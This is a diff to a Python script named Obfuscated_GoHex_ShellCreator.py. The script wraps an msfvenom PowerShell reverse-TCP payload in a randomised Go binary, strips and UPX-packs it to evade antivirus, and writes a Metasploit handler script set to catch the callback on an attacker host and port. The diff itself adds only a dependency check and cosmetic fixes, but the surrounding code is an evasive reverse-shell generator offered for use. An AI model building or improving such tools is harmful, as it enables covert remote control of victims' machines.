@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 # Obfuscated_GoHex_ShellCreator.py
 # lord[at]vadersecurity.com
-""" 
+"""
 Tested on Blackarch but should work on others
 with correct env.
 
@@ -20,7 +20,7 @@ payload: windows/x64/powershell_reverse_tcp
 evades default sys install.
 
 python3 Obfuscated_GoHex_ShellCreator.py -l 192.168.1.6 -p 53 --payload \
-windows/x64/powershell_reverse_tcp 
+windows/x64/powershell_reverse_tcp
 ----- snip -----
 [+] Compiling:
 [+] Compressing binary: -> WSmiwnO.exe
@@ -37,6 +37,8 @@ set EXITFUNC thread; set ExitOnSession false ; rexploit -j -z"
 
 # import --
 import os
+import sys
+import shutil
 import string
 import random
 import argparse
@@ -48,7 +50,7 @@ from jinja2 import Environment
 # definitions --
 def Generate_msf_Payload():
     """ Generate msfvenom hex payload -- """
-    print("[+] Shell Options:\n")
+    print("\n[+] Shell Options:\n")
     print("[+] LHOST = %s" % args.LHOST)
     print("[+] LPORT = %s" % args.LPORT)
     print("[+] PAYLOAD = %s" % args.PAYLOAD)
@@ -119,7 +121,7 @@ def Golang_Shell_Template():
         srand1=go_impo, srand2=go_main, srand3=go_func, Payload=msf_Payload)
 
     # random name --
-    goShell_fName = "".join(['/tmp/', str(go_rnam), '.go']) 
+    goShell_fName = "".join(['/tmp/', str(go_rnam), '.go'])
 
     # write --
     print("[+] Writing golang shell: -> %s" % goShell_fName)
@@ -138,7 +140,7 @@ def Create_msfconsole_rcScript():
 
     rcScript = ("""
     use exploit/multi/handler
-    set LHOST {{ lhost }} 
+    set LHOST {{ lhost }}
     set LPORT {{ lport }}
     set PAYLOAD {{ payload }}
     set EXITFUNC thread
@@ -151,9 +153,9 @@ def Create_msfconsole_rcScript():
         lhost=args.LHOST, lport=args.LPORT, payload=args.PAYLOAD)
 
     # write --
-    print("[+] Writing msfconsole rc: -> ./shell.rc")
-    with open('shell.rc', 'w') as rcfile:
-              rcfile.write(rcScript_out)
+    print("[+] Writing msfconsole rc: msfconsole.rc")
+    with open('msfconsole.rc', 'w') as rcfile:
+        rcfile.write(rcScript_out)
 
 
 def Golang_Compile_Shell():
@@ -169,10 +171,25 @@ def Golang_Compile_Shell():
     """ compile -- """
     subprocess.run(['go', 'build', '-ldflags', '-w -s', goSrc],
                    capture_output=True)
-    print("[+] Compressing binary: -> %s " % goBin)
+    print("[+] Compressing binary: %s " % goBin)
     """ upx compress -- """
     subprocess.run(['upx', 'compress', goBin, '--brute'], capture_output=True)
     print("[+] Done !")
+
+
+def Check_Binary_Installation():
+    """ Check for existence of binaries --  """
+    print("[+] Checking installed binaries:\n")
+    binapps = ['go', 'upx', 'msfvenom']
+    for b in binapps:
+        b_exists = shutil.which(b)
+        if b_exists is not None:
+            print(b_exists)
+        else:
+            print("\n[!] please install: %s" % b)
+            print("[!] Exiting Now.")
+            b = None
+            sys.exit(0)
 
 
 # main --
@@ -204,6 +221,7 @@ if __name__ == '__main__':
 
     # start defs --
     print("\n[+] Starting Obfuscated_GoHex_ShellCreator.py\n")
+    Check_Binary_Installation()
     msf_Payload = Generate_msf_Payload()
     Golang_Compile_Shell()
     Create_msfconsole_rcScript()
